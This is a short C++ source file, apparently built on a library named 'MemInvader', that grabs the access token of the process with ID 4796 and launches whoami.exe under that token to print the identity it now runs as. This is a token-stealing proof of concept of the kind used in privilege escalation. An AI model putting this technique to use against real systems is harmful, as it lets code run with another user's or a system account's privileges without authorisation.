
#include "MemInvaderInclude.h"
#include <winternl.h>
using namespace std;
typedef struct _THREAD_LAST_SYSCALL_INFORMATION
{
	PVOID FirstArgument;
	USHORT SystemCallNumber;

} THREAD_LAST_SYSCALL_INFORMATION, * PTHREAD_LAST_SYSCALL_INFORMATION;



int main()
{

	Process a(4796);

	HANDLE token = a.getToken();

	ChildProcess whoami("C:\\WINDOWS\\system32\\whoami.exe", token);
	std::cout << whoami.read(1024);
	
	return 0;
}